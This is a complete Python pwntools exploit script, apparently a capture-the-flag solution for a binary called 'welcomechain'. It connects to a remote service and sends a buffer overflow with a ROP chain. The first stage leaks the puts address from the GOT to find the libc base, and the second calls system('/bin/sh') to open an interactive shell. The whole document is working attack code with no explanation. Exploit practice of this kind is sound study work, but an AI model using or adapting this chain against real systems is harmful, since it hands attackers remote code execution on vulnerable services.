#!/usr/bin/env python
from pwn import *

context.log_level = "DEBUG"

p = connect("114.177.250.4", 2226)
e = ELF('./welcomechain')
l = ELF('./libc.so.6')

prefix = 'A' * 40

# binary
pop_rdi_ret = 0x400853 # __libc_csu_init()
ret         = 0x4007b9 # welcome()

# libc
binsh_ofs  = 0x1b3e9a 

def leak():
    payload  = prefix
    payload += p64(pop_rdi_ret)
    payload += p64(e.got['puts'])
    payload += p64(e.plt['puts'])
    payload += p64(e.symbols['welcome'])

    p.recvuntil("Please Input : ")
    p.sendline(payload)
    p.recvline()
    
    puts_addr = u64((p.recvline())[0:6] + "\x00\x00")
    libc_base = puts_addr - l.symbols['puts']

    return libc_base

def shell(libc_base):
    binsh_addr  = libc_base + binsh_ofs
    system_addr = libc_base + l.symbols['system']
    
    payload  = prefix
    payload += p64(ret)
    payload += p64(pop_rdi_ret)
    payload += p64(binsh_addr)
    payload += p64(system_addr)

    p.recvuntil("Please Input : ")
    p.sendline(payload)
    p.recvline()

libc_base = leak()
print("libc base addr: %s" % hex(libc_base))
shell(libc_base)

p.interactive()
